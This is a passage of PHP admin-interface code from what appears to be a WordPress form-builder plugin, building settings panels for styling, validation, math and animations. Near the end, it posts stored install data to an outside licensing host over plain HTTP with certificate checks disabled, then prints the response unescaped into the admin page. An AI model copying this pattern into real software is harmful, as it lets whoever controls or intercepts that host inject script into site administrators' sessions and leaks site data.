										$output .= '</div>';
									
							$output .= '</div>';
							
							/*** Slider Styling ***/
							$output .= '<div class="settings-slider-styling" style="display:none;">';
									$output .= '<small>Slider Styling</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										//$output .= '<span class="input-group-addon current_slider_icon"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="count_text" id="count_text"  placeholder="{x}=Count placeholder">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Text Color">HTX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-text-color" name="set-slider-handel-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Background Color">HBG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-bg-color" name="set-slider-handel-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Border Color">HBR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-border-color" name="set-slider-handel-border-color" id="bs-color"></span>';	
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Background">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-bg-color" name="set-slider-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Background Fill">BGF</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-fill-color" name="set-slider-fill-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Border">BR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-border-color" name="set-slider-border-color" id="bs-color"></span>';	
									
									$output .= '</div>';
							$output .= '</div>';
							
							
	
							
							
	/*** Background settings ***/	
								$output .= '<div class="setting-wrapper setting-bg-image">';						
									$output .= '<small>Background Settings</small>';
									$output .= '<div role="toolbar" class="btn-toolbar bg-settings">';
	/*** Background image ***/									
										$output .= '<div role="group" class="btn-group align-label">';
											$output .= '<small>Image</small>';
											$output .= '<form name="do-upload-image" id="do-upload-image" action="'.admin_url('admin-ajax.php').'" method="post" enctype="multipart/form-data">';
												$output .= '<input type="hidden" name="action" value="do_upload_image">';
												$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">';
													$output .= '<div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 100px; height: 100px;"></div>';
													$output .= '<div class="upload-image-controls">';
														$output .= '<span class="input-group-addon btn-file the_input_element error_message" data-content="Please select an image" data-secondary-message="Invalid image extension" data-placement="top">';
															$output .= '<span class="fileinput-new"><span class="fa fa-cloud-upload"></span></span>';
															$output .= '<span class="fileinput-exists"><span class="fa fa-edit"></span></span>';
															$output .= '<input type="file" name="do_image_upload_preview" >';
														$output .= '</span>';
														$output .= '<a href="#" class="input-group-addon fileinput-exists" data-dismiss="fileinput"><span class="fa fa-close"></span></a>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</form>';
											
											$output .= '
											<form name="import_form" class="hidden" id="import_form" action="'.admin_url('admin-ajax.php').'" enctype="multipart/form-data" method="post">	
												<input type="file" name="form_html">
												<div class="row">
													<div class="modal-footer">
														<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
													</div>
												</div>
													
											</form>
											';
											
										$output .= '</div>';
	/*** Background size ***/									
										$output .= '<div role="group" class="btn-group bg-size">';
											$output .= '<small>Size</small>';
											$output .= '<button class="btn btn-default auto" type="button" title="Auto"><span class="icon-text">Auto</span></button>';
											$output .= '<button class="btn btn-default contain" type="button" title="Contain"><i class="fa fa-compress"></i></button>';
											$output .= '<button class="btn btn-default cover" type="button" title="Cover"><i class="fa fa-expand"></i></button>';
										$output .= '</div>';
	/*** Background repeat ***/									
										$output .= '<div role="group" class="btn-group bg-repeat">';
											$output .= '<small>Repeat</small>';
											$output .= '<button class="btn btn-default repeat" type="button" title="Repeat X &amp; Y"><i class="fa fa-arrows"></i></button>';
											$output .= '<button class="btn btn-default repeat-x" type="button" title="Repeat X"><i class="fa fa-arrows-h"></i></button>';
											$output .= '<button class="btn btn-default repeat-y" type="button" title="Repeat Y"><i class="fa fa-arrows-v"></i></button>';
											$output .= '<button class="btn btn-default no-repeat" type="button" title="None"><span class="icon-text">No</span></button>';
										$output .= '</div>';
	/*** Background position ***/									
										$output .= '<div role="group" class="btn-group bg-position">';
											$output .= '<small>Position</small>';
											$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
											$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
											$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
										$output .= '</div>';
									
									$output .= '</div>';
								
								$output .= '</div>';
	
	/**** THUMB RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-thumb-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Thumbs Up</small>';
		/*** Thumbs Up ***/
											$output .= '<input type="text" class="form-control" name="set_thumbs_up_val" placeholder="Yes" id="set_thumbs_up_val">';
										$output .= '</div>';
										
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Thumbs Down</small>';
		/*** Thumbs down ***/
											$output .= '<input type="text" class="form-control" name="set_thumbs_down_val" placeholder="No" id="set_thumbs_down_val">';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
	/**** SMILY RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-smily-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-3">';
										
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Bad</small>';
	/*** Frown ***/
										$output .= '<input type="text" class="form-control" name="set_smily_frown_val" placeholder="Bad" id="set_smily_frown_val">';
									$output .= '</div>';
								
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Average</small>';
										$output .= '<input type="text" class="form-control" name="set_smily_average_val" placeholder="Average" id="set_smily_average_val">';
									$output .= '</div>';
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Good</small>';
	/*** Smile ***/
										$output .= '<input type="text" class="form-control" name="set_smily_good_val" placeholder="Good" id="set_smily_good_val">';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
									
									
							
	/**** STAR RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-star-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Stars</small>';
		/*** Total Stars ***/
											$output .= '<input type="text" class="form-control" name="total_stars" placeholder="Total stars" id="total_stars">';
										$output .= '</div>';
										
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Enable half stars</small>';
		/*** Half star ***/
												$output .= '<select class="form-control" name="set_half_stars">
																	 		<option value="no">No</option>
																			<option value="yes">Yes</option>
																		</select>';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
		
		
											$output .= '<div role="toolbar" class="btn-toolbar survey-field-settings">';
												$output .= '<div role="group" class="btn-group align-input-container">';
													$output .= '<small>Alignment</small>';
													$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
													$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
													$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
												$output .= '</div>';
				/*** Input size ***/
												/*$output .= '<div role="group" class="btn-group set-icon-size">';
													$output .= '<small>Size</small>';
													$output .= '<button class="btn btn-default small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
													$output .= '<button class="btn btn-default normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
													$output .= '<button class="btn btn-default large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
												$output .= '</div>';*/
											$output .= '</div>';
		
		
		/**** SLIDER SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-slider-options">';	
										
											$output .= '<div role="toolbar" class="btn-toolbar col-4">';
				/*** Start Value ***/	
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Starting value</small>';
													$output .= '<input type="text" class="form-control" name="start_value" id="start_value"  placeholder="Enter start value">';
												$output .= '</div>';
				/*** Min Value ***/
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Minimum Value</small>';
													$output .= '<input type="text" class="form-control" name="minimum_value" id="minimum_value"  placeholder="Enter min value">';
												$output .= '</div>';
				/*** Max Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Maximum Value</small>';
													$output .= '<input type="text" class="form-control" name="maximum_value" id="maximum_value"  placeholder="Enter max value">';
												$output .= '</div>';
				/*** Step Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Step Value</small>';
													$output .= '<input type="text" class="form-control" name="step_value" id="step_value"  placeholder="Enter step value">';
												$output .= '</div>';
											
										$output .= '</div>';
										
								$output .= '</div>';
			/**** SLIDER SETTINGS ****/
				
									
						
										$output .= '<div class="col-sm-12 settings-grid-system settings-col-1">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 1 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-1-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-2">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 2 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-2-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-3">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 3 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-3-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-4">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 4 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-4-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-5">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 5 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-5-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-6">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 6 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-6-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
							
							

						
					
			$output .= '</div>';
								
					
					
					
					
					
					
					
					
					
					
					
					$output .= '</div>';
					
						

//VALIDATION SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="validation-settings settings-section" style="display:none;">';
								
								$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Required ***/	
									$output .= '
																	<div class="btn-group required">
																		<small>Required</small>
																		<button class="btn btn-default btn-sm yes" type="button"><span class="glyphicon glyphicon-thumbs-up"></span>&nbsp;&nbsp;Yes</button>
																		<button class="btn btn-default btn-sm no active" type="button">&nbsp;<span class="glyphicon glyphicon-thumbs-down"></span>&nbsp;&nbsp;No</button>
																	  </div>
																	<div class="btn-group required-star">
																		<small>Indicator</small>
																		<button class="btn btn-default btn-sm full active" type="button">&nbsp;<span class="glyphicon glyphicon-star"></span>&nbsp;</button>
																		<button class="btn btn-default btn-sm empty" type="button">&nbsp;<span class="glyphicon glyphicon-star-empty"></span>&nbsp;</button>
																	  	<button class="btn btn-default btn-sm asterisk" type="button">&nbsp;<span class="glyphicon glyphicon-asterisk"></span>&nbsp;</button>
																		<button class="btn btn-default btn-sm none" type="button">&nbsp;<span class=""></span>None</button>
																	  </div>
																	 <div class="input-group input-group-sm"><small>Validate As</small>
																		<select class="form-control" name="validate-as">
																	 		<option value="" selected="selected">Any Format</option>
																			<option value="email">Email</option>
																			<option value="url">URL</option>
																			<option value="phone_number">Phone Number</option>
																			<option value="numbers_only">Numbers Only</option>
																			<option value="text_only">Text Only</option>
																		</select>
																	 </div> 
																	  ';
									$output .= '</div>';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Error Messsage ***/	
									$output .= '
											 <div class="input-group input-group-sm"><small>Error Message</small>
												<input type="text" placeholder="Error Message" id="the_error_mesage" name="the_error_mesage" class="form-control">
												
											 </div> 
											  <div class="input-group input-group-sm"><small>Secondary Error Message</small>
												<input type="text" placeholder="Enter Secondary Message" id="set_secondary_error" name="set_secondary_error" class="form-control">
											 </div> 
											  ';
									$output .= '</div>';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-2 max-min-settings">';
	/*** MAX MIN ***/	
									$output .= '
											 <div class="input-group input-group-sm"><small>Maximum Characters</small>
												<input type="text" placeholder="Enter maximum allowed characters" id="set_max_val" name="set_max_val" class="form-control">
												
											 </div> 
											  <div class="input-group input-group-sm"><small>Minimum Characters</small>
												<input type="text" placeholder="Enter minimum allowed characters" id="set_min_val" name="set_min_val" class="form-control">
											 </div> 
											  ';
									$output .= '</div>';
									$output .= '<div class="multi-upload-validation-settings" style="display:none;">';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set Max File Size per File</small>
													<input type="text" placeholder="Set max file size per file in MB (0=unlimited)" id="max_file_size_pf" name="max_file_size_pf" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceeding max file size p/file</small>
													<input type="text" placeholder="Message if max size is exceeded per file" id="max_file_size_pf_error" name="max_file_size_pf_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set Max Size for all Files</small>
													<input type="text" placeholder="Set max size for all files in MB (0=unlimited)" id="max_file_size_af" name="max_file_size_af" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceeding Size of all Files</small>
													<input type="text" placeholder="Message if size of all files are exceeded" id="max_file_size_af_error" name="max_file_size_af_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set File Upload Limit</small>
													<input type="text" placeholder="Set max files that can be uploaded (0=unlimited)" id="max_upload_limit" name="max_upload_limit" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceding max file upload limit</small>
													<input type="text" placeholder="Message if upload limit is exceeded" id="max_upload_limit_error" name="max_upload_limit_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										
										
										
									$output .= '</div>';
									$output .= '<div class="uploader-settings" style="display:none;">';
									
										$output .= '<small>Allowed Extentions</small><textarea class="form-control" name="set_extensions" id="set_extensions"></textarea>';
									$output .= '</div>';
								$output .= '</div>';

//MATH SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="math-settings settings-section">';
								$output .= '<div role="toolbar" class="btn-toolbar col-3">';
	/*** Input Placeholder ***/	;
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Form fields</small>';
										$output .= '<select class="form-control" name="math_fields"></select>';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Math Result Name</small>';
										$output .= '<input type="text" class="form-control" name="set_math_input_name" id="set_math_input_name"  placeholder="Unique Identifier">';
									$output .= '</div>';
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Decimal Places</small>';
										$output .= '<input type="text" class="form-control" name="set_decimals" id="set_decimals"  placeholder="Set result decimal places">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
								$output .= '<small>Math Equation</small><textarea class="form-control" name="set_math_logic_equation" id="set_math_logic_equation"></textarea>';
							$output .= '</div>';
						
//ANIMATION SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="animation-settings settings-section" style="display:none;">';
								
								$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Animation Selection ***/	
									$output .= ' <div class="input-group input-group-sm"><small>Animation</small>
														<select id="field_animation" class="form-control" name="field_animation">
															  <option selected="selected" value="no_animation">No Animation</option>
																	<optgroup label="Attention Seekers">
																	  <option value="bounce">bounce</option>
																	  <option value="flash">flash</option>
																	  <option value="pulse">pulse</option>
																	  <option value="rubberBand">rubberBand</option>
																	  <option value="shake">shake</option>
																	  <option value="swing">swing</option>
																	  <option value="tada">tada</option>
																	  <option value="wobble">wobble</option>
																	  <option value="jello">jello</option>
																	</optgroup>
															
																	<optgroup label="Bouncing Entrances">
																	  <option value="bounceIn">bounceIn</option>
																	  <option value="bounceInDown">bounceInDown</option>
																	  <option value="bounceInLeft">bounceInLeft</option>
																	  <option value="bounceInRight">bounceInRight</option>
																	  <option value="bounceInUp">bounceInUp</option>
																	</optgroup>
													
															<optgroup label="Bouncing Exits">
															  <option value="bounceOut">bounceOut</option>
															  <option value="bounceOutDown">bounceOutDown</option>
															  <option value="bounceOutLeft">bounceOutLeft</option>
															  <option value="bounceOutRight">bounceOutRight</option>
															  <option value="bounceOutUp">bounceOutUp</option>
															</optgroup>
													
															<optgroup label="Fading Entrances">
															  <option value="fadeIn">fadeIn</option>
															  <option value="fadeInDown">fadeInDown</option>
															  <option value="fadeInDownBig">fadeInDownBig</option>
															  <option value="fadeInLeft">fadeInLeft</option>
															  <option value="fadeInLeftBig">fadeInLeftBig</option>
															  <option value="fadeInRight">fadeInRight</option>
															  <option value="fadeInRightBig">fadeInRightBig</option>
															  <option value="fadeInUp">fadeInUp</option>
															  <option value="fadeInUpBig">fadeInUpBig</option>
															</optgroup>
													
															<optgroup label="Fading Exits">
															  <option value="fadeOut">fadeOut</option>
															  <option value="fadeOutDown">fadeOutDown</option>
															  <option value="fadeOutDownBig">fadeOutDownBig</option>
															  <option value="fadeOutLeft">fadeOutLeft</option>
															  <option value="fadeOutLeftBig">fadeOutLeftBig</option>
															  <option value="fadeOutRight">fadeOutRight</option>
															  <option value="fadeOutRightBig">fadeOutRightBig</option>
															  <option value="fadeOutUp">fadeOutUp</option>
															  <option value="fadeOutUpBig">fadeOutUpBig</option>
															</optgroup>
													
															<optgroup label="Flippers">
															  <option value="flip">flip</option>
															  <option value="flipInX">flipInX</option>
															  <option value="flipInY">flipInY</option>
															  <option value="flipOutX">flipOutX</option>
															  <option value="flipOutY">flipOutY</option>
															</optgroup>
													
															<optgroup label="Lightspeed">
															  <option value="lightSpeedIn">lightSpeedIn</option>
															  <option value="lightSpeedOut">lightSpeedOut</option>
															</optgroup>
													
															<optgroup label="Rotating Entrances">
															  <option value="rotateIn">rotateIn</option>
															  <option value="rotateInDownLeft">rotateInDownLeft</option>
															  <option value="rotateInDownRight">rotateInDownRight</option>
															  <option value="rotateInUpLeft">rotateInUpLeft</option>
															  <option value="rotateInUpRight">rotateInUpRight</option>
															</optgroup>
													
															<optgroup label="Rotating Exits">
															  <option value="rotateOut">rotateOut</option>
															  <option value="rotateOutDownLeft">rotateOutDownLeft</option>
															  <option value="rotateOutDownRight">rotateOutDownRight</option>
															  <option value="rotateOutUpLeft">rotateOutUpLeft</option>
															  <option value="rotateOutUpRight">rotateOutUpRight</option>
															</optgroup>
													
															<optgroup label="Sliding Entrances">
															  <option value="slideInUp">slideInUp</option>
															  <option value="slideInDown">slideInDown</option>
															  <option value="slideInLeft">slideInLeft</option>
															  <option value="slideInRight">slideInRight</option>
													
															</optgroup>
															<optgroup label="Sliding Exits">
															  <option value="slideOutUp">slideOutUp</option>
															  <option value="slideOutDown">slideOutDown</option>
															  <option value="slideOutLeft">slideOutLeft</option>
															  <option value="slideOutRight">slideOutRight</option>
															  
															</optgroup>
															
															<optgroup label="Zoom Entrances">
															  <option value="zoomIn">zoomIn</option>
															  <option value="zoomInDown">zoomInDown</option>
															  <option value="zoomInLeft">zoomInLeft</option>
															  <option value="zoomInRight">zoomInRight</option>
															  <option value="zoomInUp">zoomInUp</option>
															</optgroup>
															
															<optgroup label="Zoom Exits">
															  <option value="zoomOut">zoomOut</option>
															  <option value="zoomOutDown">zoomOutDown</option>
															  <option value="zoomOutLeft">zoomOutLeft</option>
															  <option value="zoomOutRight">zoomOutRight</option>
															  <option value="zoomOutUp">zoomOutUp</option>
															</optgroup>
													
															<optgroup label="Specials">
															  <option value="hinge">hinge</option>
															  <option value="rollIn">rollIn</option>
															  <option value="rollOut">rollOut</option>
															</optgroup>
														  </select><br />
														  <small>Animation Delay</small>
														 <input type="text" class="form-control" name="animation_delay" placeholder="Set delay in seconds" id="animation_delay"><br />
														 <small>Animation Duration</small>
														 <input type="text" class="form-control" name="animation_duration" placeholder="Set duration in seconds" id="animation_duration">
													 </div> 
													  <div class="input-group input-group-sm"><small>Animation Preview</small>
												<div class="animation_preview_container"><div class="animation_preview">Animation</div></div>
											 </div> 
													  ';
									$output .= '</div>';
									
									
									
								
								$output .= '</div>';						
						
							
						$output .= '</div>';
					
					
						$output .= '<div class="fa-icons-list">';
							$output .= '<div class="row">';
								$output .= '<div class="col-xs-10">';
									$output .= '<div role="group" class="input-group input-group-sm">';
										$output .= '<input type="text" placeholder="Search Icons" class="icon_search form-control" name="icon_search" id="icon_search">';
										$output .= '<span class="input-group-addon"><span class="fa fa-search"></span></span>';
									$output .= '</div>';
								$output .= '</div>';
								$output .= '<div class="col-xs-2">';
									$output .= '<span class="close_icons fa fa-close"></span>';
								$output .= '</div>';
							$output .= '</div>';
							$output .= '<div class="inner">';
								$get_icons = new NF5_icons();
								$output .= $get_icons->get_fa_icons();
							$output .= '</div>';
						$output .= '</div>';
					
					
					
					$output .= '</div>';
					
				$output .= '</div>';
				
				
				
				
				
			$output .= '</div>';
			$api_params = array( 'get_code' => 1,'ins_data'=>get_option('7103891'),'paypal_in_use'=>( is_plugin_active( 'nex-forms-paypal-add-on/main.php' )) ? 1 : 0);
			$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
			$output .= $response['body'];	
				$output .= '<div class="styling-bar nf_tutorial_step_11 nf_tutorial " data-placement="left" title="Styling Tools <span class=\'fa fa-close\'></span>" data-content="
					  		Styling tools can be used to quickly style form fields and elements. Click on a tool and then on a label or field to style it according to the selected tool.<br><br>For Colors and Google fonts, select the color or font first then click on the tool to apply the selected color or font.<br><br>To exit a tool press Enter or Ctrl+C.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
